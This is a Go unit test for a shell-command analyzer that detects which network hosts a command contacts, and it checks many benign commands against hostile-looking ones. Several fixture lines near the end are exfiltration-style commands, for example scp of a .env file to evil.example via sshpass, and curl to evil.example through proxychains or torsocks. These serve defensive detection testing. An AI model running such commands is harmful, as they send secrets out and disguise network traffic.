...
func TestAnalyze_Hosts(t *testing.T) {
	...
	cases := []struct {
		...
		{"xargs replace flag in a group", `echo evil.example | xargs -0I{} curl https://{}/x`, []string{UnknownHost}},
		...
		{"go test of a package named ssh", `go test ./internal/ssh`, nil},
		{"docker pull of a curl image", `docker pull curlimages/curl`, nil},
		{"go build of a command named host", `go build -o bin/host ./cmd/host`, nil},
		{"make in a directory named ping", `make -C ping`, nil},
		{"man page of curl", `man curl`, nil},
		{"npm ls of git", `npm ls git`, nil},
		{"unknown command with a relative tool path", `mytool ./cmd/host`, nil},
		{"unknown command with a package path", `mytool curlimages/curl`, nil},
		{"test filter", `pytest -k ssh`, nil},
		{"python module test filter", `python -m pytest -k host`, nil},
		{"jest test name", `jest ssh`, nil},
		{"build target", `cmake --build build --target curl`, nil},
		{"service status", `systemctl status ssh`, nil},
		{"journal of a unit", `journalctl -u ssh`, nil},
		{"kill by name", `pkill ssh`, nil},
		{"python unittest filter", `python -m unittest -k ssh`, nil},
		{"rspec example filter", `rspec -e ssh`, nil},
		{"phpunit filter", `phpunit --filter ssh`, nil},
		{"dotnet test filter", `dotnet test --filter ssh`, nil},
		{"node test name pattern", `node --test --test-name-pattern ssh`, nil},
		{"file type of a network tool", `file /usr/bin/curl`, nil},
		{"debian service restart", `service ssh restart`, nil},
		{"pid of a network tool", `kill $(pidof ssh)`, nil},
		{"help page of curl", `tldr curl`, nil},
		{"info page of curl", `info curl`, nil},
		{"sshpass", `sshpass -e scp .env user@evil.example:/tmp`, []string{"evil.example"}},
		{"sshpass password file", `sshpass -f pw ssh evil.example`, []string{"evil.example"}},
		{"proxychains", `proxychains -q curl evil.example`, []string{"evil.example"}},
		{"torsocks", `torsocks -a 127.0.0.1 curl evil.example`, []string{"evil.example"}},
		{"firejail", `firejail --quiet curl evil.example`, []string{"evil.example"}},
		{"network tool after the end of options", `mytool -- curl evil.example`, []string{UnknownHost}},
